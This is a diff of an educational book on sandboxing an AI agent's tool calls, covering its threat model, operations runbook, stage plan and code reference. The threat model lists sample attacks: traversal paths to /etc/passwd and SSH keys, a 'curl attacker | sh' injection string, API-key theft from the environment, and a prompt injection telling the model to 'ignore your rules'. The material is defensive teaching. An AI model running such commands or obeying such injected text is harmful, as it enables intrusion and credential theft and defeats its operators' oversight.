 <tr><td style="text-align:left">Docker daemon</td><td style="text-align:left">Can create containers with broad host access</td><td style="text-align:left">Trusted infrastructure; must be protected</td></tr>
 </tbody></table></div>
 <p>The model is not a security principal. It can be convinced by a README, an issue comment, or a test fixture to ask for the wrong thing. The harness must make the wrong thing fail safely.</p>
-</section>
-<section id="s73">
-<h2><span class="num">73</span><span>3. Trust boundaries</span></h2>
+<h3 id="s08-03">3. Trust boundaries</h3>
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>user / model text
       |
       v
@@ -1104,63 +1042,59 @@ python -m pytest -v</pre></figure>
 <li><strong>Process to host.</strong> Container namespaces, cgroups, capabilities, seccomp.</li>
 <li><strong>Harness to audit.</strong> Append-only chain outside the writable workspace.</li>
 </ol>
-</section>
-<section id="s74">
-<h2><span class="num">74</span><span>4. Threats and controls</span></h2>
-<h3 id="s74-01">T1 — Path traversal</h3>
+<h3 id="s08-04">4. Threats and controls</h3>
+<h4 id="s08-04-01">T1 — Path traversal</h4>
 <p><strong>Attack:</strong> <code>../../etc/passwd</code>, <code>..\..\Users\me\.ssh\id_rsa</code>, encoded or repeated separators.</p>
 <p><strong>Control:</strong> <code>PathPolicy</code> normalises separators, collapses <code>.</code> and <code>..</code>, and checks containment against canonical paths. Tests: ch01 traversal cases.</p>
 <p><strong>Residual:</strong> A same-user process can bypass Python entirely. The container is the answer for command execution.</p>
-<h3 id="s74-02">T2 — Prefix-sibling escape</h3>
+<h4 id="s08-04-02">T2 — Prefix-sibling escape</h4>
 <p><strong>Attack:</strong> workspace <code>/tmp/ws</code>, target <code>/tmp/ws-evil/secret</code>.</p>
 <p><strong>Control:</strong> <code>os.path.commonpath</code> on canonical paths, not <code>startswith</code>. Tests: ch00 asserts the bug; ch01 asserts the refusal.</p>
-<h3 id="s74-03">T3 — Symlink escape</h3>
+<h4 id="s08-04-03">T3 — Symlink escape</h4>
 <p><strong>Attack:</strong> plant <code>workspace/link -&gt; /home/me/.ssh</code>, then read or write through it.</p>
 <p><strong>Control:</strong> resolve the deepest existing ancestor with <code>realpath</code>, then reattach the missing tail; re-check containment; refuse writes through a final symlink. Tests: ch01 and ch02, skipped when the OS cannot create links.</p>
 <p><strong>Residual:</strong> A time-of-check/time-of-use race between <code>realpath</code> and <code>open</code>. The sandbox is policy, not a kernel boundary.</p>
-<h3 id="s74-04">T4 — Windows-specific path confusion</h3>
+<h4 id="s08-04-04">T4 — Windows-specific path confusion</h4>
 <p><strong>Attack:</strong> <code>C:foo</code> drive-relative paths, UNC paths, <code>CON</code>/<code>NUL</code> device names, trailing dots or spaces, NTFS alternate data streams.</p>
 <p><strong>Control:</strong> reject drive-relative and UNC forms; reject reserved names; reject colon-bearing/alternate-data-stream names; reject control characters; normalise separators; compare case-insensitively on Windows. Tests: ch01.</p>
 <p><strong>Residual:</strong> The policy does not parse every Windows path form; unusual device paths or filesystem features should be handled by the host policy and the container boundary.</p>
-<h3 id="s74-05">T5 — Shell injection</h3>
+<h4 id="s08-04-05">T5 — Shell injection</h4>
 <p><strong>Attack:</strong> <code>python -c &quot;...&quot; ; curl attacker | sh</code>, <code>&amp;&amp;</code>, pipes, command substitution.</p>
 <p><strong>Control:</strong> argv lists only; no <code>shell=True</code> for model input. A semicolon is an argument. Tests: ch03 shell-semantics case.</p>
 <p><strong>Residual:</strong> An allowlisted program can still spawn helpers. The container limits what those helpers can reach.</p>
-<h3 id="s74-06">T6 — Environment leakage</h3>
+<h4 id="s08-04-06">T6 — Environment leakage</h4>
 <p><strong>Attack:</strong> read <code>OPENROUTER_API_KEY</code>, proxy credentials or cloud tokens from the inherited environment.</p>
 <p><strong>Control:</strong> build a minimal environment from OS-essential keys plus workspace-local <code>HOME</code>/<code>TMP</code>; do not pass the host environment. Tests: ch03 and ch04.</p>
 <p><strong>Residual:</strong> A secret deliberately placed in the new environment is visible to the child. Do not add secrets to the tool environment.</p>
-<h3 id="s74-07">T7 — Resource exhaustion</h3>
+<h4 id="s08-04-07">T7 — Resource exhaustion</h4>
 <p><strong>Attack:</strong> allocate memory forever, fork bomb, fill the disk, print gigabytes, open thousands of files, sleep forever.</p>
 <p><strong>Control:</strong> byte caps and entry caps (ch02); timeout, process-tree kill, output caps and POSIX rlimits (ch03); container memory, swap, CPU, pids and nofile limits (ch04); a hard <code>max_steps</code> (ch05).</p>
 <p><strong>Residual:</strong> The local runner’s Windows path has no rlimits; use Docker. A container can still consume its limits and slow the host.</p>
-<h3 id="s74-08">T8 — Network access and exfiltration</h3>
+<h4 id="s08-04-08">T8 — Network access and exfiltration</h4>
 <p><strong>Attack:</strong> send workspace contents or secrets to a remote endpoint.</p>
 <p><strong>Control:</strong> <code>--network none</code> in the container. Tests: ch04 integration tries a TCP connection and expects failure.</p>
 <p><strong>Residual:</strong> The host-side file tools do not use the network, but the Docker daemon, host processes and sibling containers are outside this control.</p>
-<h3 id="s74-09">T9 — Container escape / privilege escalation</h3>
+<h4 id="s08-04-09">T9 — Container escape / privilege escalation</h4>
 <p><strong>Attack:</strong> exploit a setuid binary, a kernel bug, a mounted device, the Docker socket, or excessive capabilities.</p>
 <p><strong>Control:</strong> non-root user, <code>--cap-drop ALL</code>, <code>no-new-privileges</code>, read-only root, no privileged mode, no Docker socket mount, default seccomp, minimal image. Tests: ch04 asserts the flags and the root-write refusal.</p>
 <p><strong>Residual:</strong> Containers share the host kernel. Kernel and daemon exploits are outside this book’s boundary. Host hardening, rootless Docker and a patched kernel belong to platform operations.</p>
-<h3 id="s74-10">T10 — Image supply chain</h3>
+<h4 id="s08-04-10">T10 — Image supply chain</h4>
 <p><strong>Attack:</strong> a poisoned base image, a compromised registry, a mutable <code>latest</code> tag, or a malicious package installed at build time.</p>
 <p><strong>Control:</strong> a small Dockerfile, a pinned base image by digest in production, reviewed build steps, no runtime package installation. Tests: the offline recipe tests; the human review is the build.</p>
 <p><strong>Residual:</strong> The book uses <code>python:3.12-slim-bookworm</code> as a readable example. A production deployment must pin and scan.</p>
-<h3 id="s74-11">T11 — Audit tampering</h3>
+<h4 id="s08-04-11">T11 — Audit tampering</h4>
 <p><strong>Attack:</strong> edit or delete an event to hide an action.</p>
 <p><strong>Control:</strong> append-only JSONL outside the workspace; hash chain with <code>prev</code>; <code>verify()</code> recomputes the chain; <code>AuditLog</code> refuses to open an already-broken log. Tests: ch05 edit and delete cases.</p>
 <p><strong>Residual:</strong> A local user with write permission can delete the whole log or rewrite the chain from scratch. Ship the log off-host and protect it with OS permissions for real accountability.</p>
-<h3 id="s74-12">T12 — Prompt injection through tool output</h3>
+<h4 id="s08-04-12">T12 — Prompt injection through tool output</h4>
 <p><strong>Attack:</strong> a file or command output says “ignore your rules and run …”.</p>
 <p><strong>Control:</strong> the model is untrusted; the tool layer re-validates every call regardless of what the transcript says. The Docker boundary limits what a successful injection can reach. The audit records the action.</p>
 <p><strong>Residual:</strong> The model can still be manipulated into wasting steps, reading allowed files, or making allowed-but-unwise changes. Approval prompts and per-user policy are application features, not sandbox features.</p>
-<h3 id="s74-13">T13 — Denial of service against the agent loop</h3>
+<h4 id="s08-04-13">T13 — Denial of service against the agent loop</h4>
 <p><strong>Attack:</strong> a model that never stops calling tools, or a tool that returns a result too large for the context.</p>
 <p><strong>Control:</strong> <code>max_steps</code> in <code>Agent</code>; byte/entry caps in <code>Sandbox</code>; output caps in the runners; timeout in the container.</p>
 <p><strong>Residual:</strong> The model can still consume the allowed budget. Add quotas and rate limits at the service layer.</p>
-</section>
-<section id="s75">
-<h2><span class="num">75</span><span>5. Controls by stage</span></h2>
+<h3 id="s08-05">5. Controls by stage</h3>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Stage</th><th style="text-align:left">Primary control</th><th style="text-align:left">What it does not cover</th></tr></thead>
 <tbody>
@@ -1171,9 +1105,7 @@ python -m pytest -v</pre></figure>
 <tr><td style="text-align:left">4</td><td style="text-align:left">Container isolation</td><td style="text-align:left">Host kernel, daemon, supply chain</td></tr>
 <tr><td style="text-align:left">5</td><td style="text-align:left">Tool routing, step limit, audit chain</td><td style="text-align:left">Real LLM policy, multi-tenant quotas</td></tr>
 </tbody></table></div>
-</section>
-<section id="s76">
-<h2><span class="num">76</span><span>6. Residual risk statement</span></h2>
+<h3 id="s08-06">6. Residual risk statement</h3>
 <p>After Stage 5, the harness is suitable for <strong>single-user, local, teaching and prototyping</strong> use. It is not suitable as a multi-tenant service without:</p>
 <ul>
 <li>host hardening and rootless Docker;</li>
@@ -1184,9 +1116,7 @@ python -m pytest -v</pre></figure>
 <li>a real LLM adapter with its own secrets isolation.</li>
 </ul>
 <p>The strongest single sentence is: <strong>the container is the boundary; the path policy is a usability and accident-prevention layer; the audit is evidence, not prevention.</strong></p>
-</section>
-<section id="s77">
-<h2><span class="num">77</span><span>7. Review checklist</span></h2>
+<h3 id="s08-07">7. Review checklist</h3>
 <p>Before changing any boundary, answer these:</p>
 <ul>
 <li>[ ] Which asset does this change protect?</li>
@@ -1199,12 +1129,10 @@ python -m pytest -v</pre></figure>
 </ul>
 <hr>
 </section>
-<section id="s78">
-<h2><span class="num">78</span><span>Operations runbook</span></h2>
+<section id="s09">
+<h2><span class="num">09</span><span>Operations runbook</span></h2>
 <p>This is the operator-facing companion to the chapters. It assumes you have read <code>THREAT_MODEL.md</code> and understand that the <strong>container is the boundary</strong>; the Python path policy is accident prevention and usability, not a jail.</p>
-</section>
-<section id="s79">
-<h2><span class="num">79</span><span>1. Prerequisites</span></h2>
+<h3 id="s09-01">1. Prerequisites</h3>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Component</th><th style="text-align:left">Minimum</th><th style="text-align:left">Notes</th></tr></thead>
 <tbody>
@@ -1213,10 +1141,8 @@ python -m pytest -v</pre></figure>
 <tr><td style="text-align:left">OS</td><td style="text-align:left">Windows, macOS or Linux</td><td style="text-align:left">Symlink and rlimit tests vary by platform</td></tr>
 <tr><td style="text-align:left">Disk</td><td style="text-align:left">~1 GB for the Python base image</td><td style="text-align:left">More if you add tools</td></tr>
 </tbody></table></div>
-<p>No API key or network access is needed for the offline suites. Install pytest (<code>python -m pip install pytest</code>); it is the only test dependency.</p>
-</section>
-<section id="s80">
-<h2><span class="num">80</span><span>2. Install and verify</span></h2>
+<p>No API key or network access is needed for the offline suites. Install pytest and Rich (<code>python -m pip install pytest rich</code>). The sandbox core is standard library only; Rich is used by the demo layer for panels and colour.</p>
+<h3 id="s09-02">2. Install and verify</h3>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre># from the repository root
 for chapter in ch00 ch01 ch02 ch03 ch04 ch05; do
   echo &quot;== $chapter ==&quot;
@@ -1232,9 +1158,7 @@ docker build -t mini-harness-python:latest docker</pre></figure>
   -t registry.example.com/mini-harness-python:2026-11-07 \
   docker</pre></figure>
 <p>The book's Dockerfile uses a readable <code>FROM</code> line. A real pipeline should template the digest and record it in the release metadata.</p>
-</section>
-<section id="s81">
-<h2><span class="num">81</span><span>3. Configuration</span></h2>
+<h3 id="s09-03">3. Configuration</h3>
 <p>The defaults live in <code>DockerConfig</code> (<code>ch04</code>/<code>ch05</code>) and <code>Limits</code> (<code>ch02</code>/<code>ch03</code>). Treat them as policy, not constants to tweak casually.</p>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Knob</th><th style="text-align:left">Default</th><th style="text-align:left">Raise when</th><th style="text-align:left">Lower when</th></tr></thead>
@@ -1252,9 +1176,7 @@ docker build -t mini-harness-python:latest docker</pre></figure>
 <tr><td style="text-align:left"><code>max_steps</code></td><td style="text-align:left">8</td><td style="text-align:left">complex tasks</td><td style="text-align:left">cost/abuse control</td></tr>
 </tbody></table></div>
 <p>Change one knob at a time and add or update a test that states the new behaviour. A limit that is not tested is a comment.</p>
-</section>
-<section id="s82">
-<h2><span class="num">82</span><span>4. Docker daemon security</span></h2>
+<h3 id="s09-04">4. Docker daemon security</h3>
 <p>The daemon is more powerful than any container it starts. Protect it.</p>
 <ul>
 <li>Run Docker rootless where possible; otherwise restrict access to the <code>docker</code> group and treat that group as root-equivalent.</li>
@@ -1265,9 +1187,7 @@ docker build -t mini-harness-python:latest docker</pre></figure>
 <li>Keep the kernel and Docker patched. Container escapes often start with a kernel or runtime vulnerability.</li>
 <li>Do not add <code>--privileged</code>, <code>--device</code>, host PID/IPC namespaces, or extra capabilities to make a tool “just work”. Add the smallest explicit exception you can and document it.</li>
 </ul>
-</section>
-<section id="s83">
-<h2><span class="num">83</span><span>5. Image lifecycle</span></h2>
+<h3 id="s09-05">5. Image lifecycle</h3>
 <ol>
 <li><strong>Build</strong> in CI from a reviewed Dockerfile.</li>
 <li><strong>Pin</strong> the base image by digest; tag the result with a date and commit.</li>
@@ -1279,9 +1199,7 @@ docker build -t mini-harness-python:latest docker</pre></figure>
 <li><strong>Retire</strong> old digests and keep the previous known-good digest for rollback.</li>
 </ol>
 <p><code>DockerRunner.build()</code> is an explicit operator action. Do not expose it as a model tool.</p>
-</section>
-<section id="s84">
-<h2><span class="num">84</span><span>6. Audit lifecycle</span></h2>
+<h3 id="s09-06">6. Audit lifecycle</h3>
 <p>The audit file is append-only JSONL written beside the workspace:</p>
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>&lt;workspace parent&gt;/audit/events.jsonl</pre></figure>
 <p>Operational rules:</p>
@@ -1293,7 +1211,7 @@ docker build -t mini-harness-python:latest docker</pre></figure>
 <li><strong>Retention.</strong> Decide how long task transcripts and audit events are kept. They may contain source code and user data even after redaction.</li>
 <li><strong>Redaction is not classification.</strong> <code>api_key</code>, <code>token</code>, <code>secret</code>, <code>password</code> and <code>credential</code> keys are masked, but arbitrary content can still contain sensitive data. Treat logs accordingly.</li>
 </ul>
-<h3 id="s84-01">Audit verification</h3>
+<h4 id="s09-06-01">Audit verification</h4>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>cd ch05
 python - &lt;&lt;'PY'
 from pathlib import Path
@@ -1303,9 +1221,7 @@ print(&quot;events:&quot;, len(log.events()))
 print(&quot;chain:&quot;, log.verify())
 PY</pre></figure>
 <p><code>AuditLog</code> refuses to open a log that is already broken. That is intentional: do not “fix” the file to make the check pass.</p>
-</section>
-<section id="s85">
-<h2><span class="num">85</span><span>7. Monitoring and alerts</span></h2>
+<h3 id="s09-07">7. Monitoring and alerts</h3>
 <p>Alert on:</p>
 <ul>
 <li>a rising rate of <code>ERROR[PATH]</code>, <code>ERROR[DENIED]</code>, <code>ERROR[CWD]</code> or <code>ERROR[DOCKER_MISSING]</code> observations (possible probing or misconfiguration);</li>
@@ -1316,10 +1232,8 @@ PY</pre></figure>
 <li>repeated <code>agent.max_steps</code> stops (prompt or tool-contract issue).</li>
 </ul>
 <p>Dashboards should separate <strong>refusals</strong> (the sandbox working) from <strong>failures</strong> (the sandbox or infrastructure broken). A refusal spike is not automatically an incident; a dropped audit event is.</p>
-</section>
-<section id="s86">
-<h2><span class="num">86</span><span>8. Incident response</span></h2>
-<h3 id="s86-01">Suspected sandbox escape or host compromise</h3>
+<h3 id="s09-08">8. Incident response</h3>
+<h4 id="s09-08-01">Suspected sandbox escape or host compromise</h4>
 <ol>
 <li><strong>Stop new work.</strong> Disable the agent’s task intake; do not just ask the model to stop.</li>
 <li><strong>Isolate the host.</strong> Remove it from the network / stop the Docker daemon if the blast radius is unknown.</li>
@@ -1329,14 +1243,14 @@ PY</pre></figure>
 <li><strong>Patch and retest</strong> the specific control; add a regression test before re-enabling.</li>
 <li><strong>Review other hosts</strong> with the same image/daemon configuration.</li>
 </ol>
-<h3 id="s86-02">Audit chain failure</h3>
+<h4 id="s09-08-02">Audit chain failure</h4>
 <ol>
 <li>Treat the log as untrusted.</li>
 <li>Compare the last verified event with the log shipper’s copy.</li>
 <li>Check file permissions, disk errors and process crashes before assuming malicious tampering.</li>
 <li>Preserve the broken segment; start a new one only after the investigation.</li>
 </ol>
-<h3 id="s86-03">Runaway container</h3>
+<h4 id="s09-08-03">Runaway container</h4>
 <ol>
 <li><code>docker ps</code> to find the named container (<code>mini-harness-*</code>).</li>
 <li><code>docker rm -f &lt;name&gt;</code>.</li>
@@ -1344,9 +1258,7 @@ PY</pre></figure>
 <li>Inspect <code>DockerRunner</code> timeout and <code>--stop-timeout</code> settings.</li>
 <li>Lower the per-command timeout or memory limit if the task does not need it.</li>
 </ol>
-</section>
-<section id="s87">
-<h2><span class="num">87</span><span>9. Kill switch</span></h2>
+<h3 id="s09-09">9. Kill switch</h3>
 <p>The minimum viable kill switch is:</p>
 <ul>
 <li>stop accepting new tasks in the application;</li>
@@ -1355,17 +1267,13 @@ PY</pre></figure>
 <li>preserve the audit log.</li>
 </ul>
 <p>Do not rely on a prompt instruction (“stop using tools”). The model is not a security control.</p>
-</section>
-<section id="s88">
-<h2><span class="num">88</span><span>10. Windows and macOS notes</span></h2>
+<h3 id="s09-10">10. Windows and macOS notes</h3>
 <ul>
 <li><strong>Windows</strong> needs Developer Mode or elevation to create symlinks; the path tests skip otherwise. POSIX <code>RLIMIT_*</code> tests skip. Docker Desktop runs Linux containers in a VM; the host file sharing layer matters for workspace permissions.</li>
 <li><strong>macOS</strong> has POSIX rlimits and symlinks; Docker Desktop also runs a VM. File sharing performance and permission mapping are host-specific.</li>
 <li><strong>Linux</strong> is the closest match to the book’s container assumptions. Use a non-root user, rootless Docker if possible, and a workspace owned by a uid that matches the container <code>--user</code>.</li>
 </ul>
-</section>
-<section id="s89">
-<h2><span class="num">89</span><span>11. Capacity planning</span></h2>
+<h3 id="s09-11">11. Capacity planning</h3>
 <p>Each concurrent agent run needs:</p>
 <ul>
 <li>one Python process (the harness);</li>
@@ -1375,9 +1283,7 @@ PY</pre></figure>
 <li>workspace disk for edits and container scratch in tmpfs.</li>
 </ul>
 <p>Size the host for the <strong>sum of container limits</strong>, not the average. A 256 MiB limit per container is small, but 100 concurrent runs are 25 GiB before the harness and the page cache.</p>
-</section>
-<section id="s90">
-<h2><span class="num">90</span><span>12. Change control checklist</span></h2>
+<h3 id="s09-12">12. Change control checklist</h3>
 <p>Before merging a change to any boundary:</p>
 <ul>
 <li>[ ] The threat model entry is updated.</li>
@@ -1391,25 +1297,21 @@ PY</pre></figure>
 </ul>
 <hr>
 </section>
-<section id="s91">
-<h2><span class="num">91</span><span>Plan — the stage contract</span></h2>
+<section id="s10">
+<h2><span class="num">10</span><span>Plan — the stage contract</span></h2>
 <div class="callout"><p><strong>Educational use only — not a production-ready system.</strong> This plan describes an educational project to learn and understand, not a production architecture. It is deliberately simplified. Do not deploy it as-is. The goal is to make each layer visible, runnable, and easy to reason about.</p></div>
 <p>This is the build contract for <strong>Build a Mini Python Sandbox</strong>. Each stage is a standalone chapter directory with runnable code and tests. A stage is done when its acceptance checks pass and its known limits are written down.</p>
 <p>The plan is deliberately narrower than “build a secure agent platform”. The subject is the boundary between a model's tool call and the operating system.</p>
-</section>
-<section id="s92">
-<h2><span class="num">92</span><span>Global rules</span></h2>
+<h3 id="s10-01">Global rules</h3>
 <ol>
-<li>Python 3.11+ for runtime code; pytest is the test runner. Docker is optional for the offline tests and required for the integration tests in Stages 4–5.</li>
+<li>Python 3.11+ for runtime code; pytest is the test runner. Rich is the only presentation dependency and is used only by the demo layer. Docker is optional for the offline tests and required for the integration tests in Stages 4–5.</li>
 <li>Every chapter runs from its own directory with <code>python -m pytest -v</code>.</li>
-<li>No network, no API key and no third-party runtime dependency in any test; pytest is the only test dependency.</li>
+<li>No network or API key is required by any test. Assertions check behaviour and observation strings, never terminal colour or panel layout.</li>
 <li>A refusal is a stable observation string, never an uncaught exception.</li>
 <li>Never weaken a test to make a demo pass. If a boundary cannot be tested on a platform, skip with a reason.</li>
 <li>Stage 0 is intentionally unsafe and must remain clearly labelled.</li>
 </ol>
-</section>
-<section id="s93">
-<h2><span class="num">93</span><span>Stage 0 — The naive fence</span></h2>
+<h3 id="s10-02">Stage 0 — The naive fence</h3>
 <p><strong>Goal:</strong> Show the failure modes before fixing them.</p>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Item</th><th style="text-align:left">Contract</th></tr></thead>
@@ -1421,9 +1323,7 @@ PY</pre></figure>
 <tr><td style="text-align:left">Limits</td><td style="text-align:left">not a sandbox; keep out of later stages</td></tr>
 </tbody></table></div>
 <p><strong>Done when:</strong> the demo exits 0, the tests pass, and the escape outcomes are asserted rather than hidden.</p>
-</section>
-<section id="s94">
-<h2><span class="num">94</span><span>Stage 1 — One path policy</span></h2>
+<h3 id="s10-03">Stage 1 — One path policy</h3>
 <p><strong>Goal:</strong> Replace the string fence with canonical path resolution.</p>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Item</th><th style="text-align:left">Contract</th></tr></thead>
@@ -1435,9 +1335,7 @@ PY</pre></figure>
 <tr><td style="text-align:left">Limits</td><td style="text-align:left">no OS boundary; TOCTOU remains</td></tr>
 </tbody></table></div>
 <p><strong>Done when:</strong> traversal and prefix-sibling escapes are refused, inside reads and writes still work, and platform-specific tests skip with a reason.</p>
-</section>
-<section id="s95">
-<h2><span class="num">95</span><span>Stage 2 — The sandbox and file tools</span></h2>
+<h3 id="s10-04">Stage 2 — The sandbox and file tools</h3>
 <p><strong>Goal:</strong> Make the policy usable by bounded tools.</p>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Item</th><th style="text-align:left">Contract</th></tr></thead>
@@ -1450,9 +1348,7 @@ PY</pre></figure>
 <tr><td style="text-align:left">Must return</td><td style="text-align:left"><code>OK: ...</code> or <code>ERROR[CODE]: ...</code></td></tr>
 </tbody></table></div>
 <p><strong>Done when:</strong> normal file work succeeds, every refusal is an observation, and no temporary writer files remain after a failure.</p>
-</section>
-<section id="s96">
-<h2><span class="num">96</span><span>Stage 3 — Running code locally</span></h2>
+<h3 id="s10-05">Stage 3 — Running code locally</h3>
 <p><strong>Goal:</strong> Replace <code>shell=True</code> with an argv runner and visible limits.</p>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Item</th><th style="text-align:left">Contract</th></tr></thead>
@@ -1465,9 +1361,7 @@ PY</pre></figure>
 <tr><td style="text-align:left">Must demonstrate</td><td style="text-align:left">the child can still read outside the workspace</td></tr>
 </tbody></table></div>
 <p><strong>Done when:</strong> a normal command works, every refusal is visible, a sleeping child is killed, output is capped, and the local runner’s residual filesystem access is documented.</p>
-</section>
-<section id="s97">
-<h2><span class="num">97</span><span>Stage 4 — Docker as the real wall</span></h2>
+<h3 id="s10-06">Stage 4 — Docker as the real wall</h3>
 <p><strong>Goal:</strong> Move command execution into a hardened container.</p>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Item</th><th style="text-align:left">Contract</th></tr></thead>
@@ -1481,9 +1375,7 @@ PY</pre></figure>
 <tr><td style="text-align:left">Must clean up</td><td style="text-align:left">remove the named container on timeout</td></tr>
 </tbody></table></div>
 <p><strong>Done when:</strong> the offline tests pass without Docker; with Docker and the image, the integration checks pass and all four boundary behaviours are observed.</p>
-</section>
-<section id="s98">
-<h2><span class="num">98</span><span>Stage 5 — The finished harness</span></h2>
+<h3 id="s10-07">Stage 5 — The finished harness</h3>
 <p><strong>Goal:</strong> Route tools, run the loop and record the trail.</p>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Item</th><th style="text-align:left">Contract</th></tr></thead>
@@ -1501,9 +1393,7 @@ PY</pre></figure>
 <li>tampering with the audit file makes <code>verify()</code> return False;</li>
 <li>all chapter suites pass, with Docker integration tests skipping cleanly.</li>
 </ul>
-</section>
-<section id="s99">
-<h2><span class="num">99</span><span>Stage boundaries and non-goals</span></h2>
+<h3 id="s10-08">Stage boundaries and non-goals</h3>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Not in this book</th><th style="text-align:left">Where it belongs</th></tr></thead>
 <tbody>
@@ -1514,9 +1404,7 @@ PY</pre></figure>
 <tr><td style="text-align:left">Image scanning and patch pipeline</td><td style="text-align:left">Supply chain/operations</td></tr>
 <tr><td style="text-align:left">OS-level syscall filtering beyond Docker defaults</td><td style="text-align:left">Platform security</td></tr>
 </tbody></table></div>
-</section>
-<section id="s100">
-<h2><span class="num">100</span><span>Definition of done for the whole book</span></h2>
+<h3 id="s10-09">Definition of done for the whole book</h3>
 <ol>
 <li>A reader can run each chapter from a clean checkout with only Python 3.11+.</li>
 <li>Every security claim in a chapter is exercised by a test or a demo.</li>
@@ -1526,12 +1414,10 @@ PY</pre></figure>
 </ol>
 <hr>
 </section>
-<section id="s101">
-<h2><span class="num">101</span><span>Function reference</span></h2>
+<section id="s11">
+<h2><span class="num">11</span><span>Function reference</span></h2>
 <p>A file-by-file and alphabetical map of the code in this repository. Each chapter is a standalone package, so some modules intentionally appear more than once (for example <code>path_policy.py</code> in chapters 1–5). When a reference and the implementation disagree, the implementation and its tests win.</p>
-</section>
-<section id="s102">
-<h2><span class="num">102</span><span>Where to start</span></h2>
+<h3 id="s11-01">Where to start</h3>
 <ol>
 <li>Read <code>ch05/mini_harness/agent.py</code> for the loop.</li>
 <li>Read <code>ch05/mini_harness/toolbox.py</code> for the dispatch point.</li>
@@ -1539,10 +1425,8 @@ PY</pre></figure>
 <li>Read <code>ch01/mini_harness/path_policy.py</code> for path containment.</li>
 <li>Read <code>ch04/mini_harness/docker_runner.py</code> for the container recipe.</li>
 </ol>
-</section>
-<section id="s103">
-<h2><span class="num">103</span><span>File map</span></h2>
-<h3 id="s103-01"><code>ch00/mini_harness/unsafe.py</code></h3>
+<h3 id="s11-02">File map</h3>
+<h4 id="s11-02-01"><code>ch00/mini_harness/unsafe.py</code></h4>
 <p>The intentionally broken fence. Do not reuse.</p>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
@@ -1553,7 +1437,7 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>_naive_inside(root, candidate)</code></td><td style="text-align:left">The bug in isolation: <code>candidate.startswith(root)</code>.</td></tr>
 <tr><td style="text-align:left"><code>_join(root, relative)</code></td><td style="text-align:left"><code>os.path.abspath(os.path.join(root, relative))</code>.</td></tr>
 </tbody></table></div>
-<h3 id="s103-02"><code>ch01/mini_harness/path_policy.py</code></h3>
+<h4 id="s11-02-02"><code>ch01/mini_harness/path_policy.py</code></h4>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
 <tbody>
@@ -1568,7 +1452,7 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>realpath_best(path)</code></td><td style="text-align:left">Public wrapper for resolve-deepest-existing-ancestor.</td></tr>
 </tbody></table></div>
 <p>Internal helpers: <code>_realpath_best</code>, <code>_check_reserved_name</code>, <code>_normalise_separators</code>, <code>_is_absolute_text</code>, <code>_comparison_form</code>.</p>
-<h3 id="s103-03"><code>ch02/mini_harness/sandbox.py</code></h3>
+<h4 id="s11-02-03"><code>ch02/mini_harness/sandbox.py</code></h4>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
 <tbody>
@@ -1582,7 +1466,7 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>Sandbox.edit_text(relative, old, new, count=1)</code></td><td style="text-align:left">Unique-match by default; <code>count=0</code> replaces all.</td></tr>
 <tr><td style="text-align:left"><code>Sandbox.delete_file(relative)</code></td><td style="text-align:left">Regular files only; refuses directories and non-regular files.</td></tr>
 </tbody></table></div>
-<h3 id="s103-04"><code>ch02/mini_harness/file_tools.py</code></h3>
+<h4 id="s11-02-04"><code>ch02/mini_harness/file_tools.py</code></h4>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
 <tbody>
@@ -1592,7 +1476,7 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>run_tool(sandbox, name, args=None) -&gt; str</code></td><td style="text-align:left">Dispatches; returns <code>OK...</code>, <code>ERROR[CODE]...</code> or <code>ERROR[INTERNAL]...</code>; never raises.</td></tr>
 </tbody></table></div>
 <p>Argument helpers: <code>_arg</code>, <code>_string_arg</code>. Rendering: <code>_format_read</code> (line numbers, line cap, truncation marker).</p>
-<h3 id="s103-05"><code>ch03/mini_harness/local_runner.py</code></h3>
+<h4 id="s11-02-05"><code>ch03/mini_harness/local_runner.py</code></h4>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
 <tbody>
@@ -1606,14 +1490,14 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>CommandRunner.run(program, args=None, cwd=&quot;.&quot;)</code></td><td style="text-align:left">List argv only; clean env; timeout; tree kill; bounded capture; POSIX rlimits.</td></tr>
 <tr><td style="text-align:left"><code>resolve_real_executable(program)</code></td><td style="text-align:left">Documentation helper showing what <code>shutil.which</code> would return; the runner does <strong>not</strong> use it.</td></tr>
 </tbody></table></div>
-<h3 id="s103-06"><code>ch03/mini_harness/command_tool.py</code></h3>
+<h4 id="s11-02-06"><code>ch03/mini_harness/command_tool.py</code></h4>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
 <tbody>
 <tr><td style="text-align:left"><code>format_result(result)</code></td><td style="text-align:left">Status header, stdout/stderr sections, empty markers, truncation flag.</td></tr>
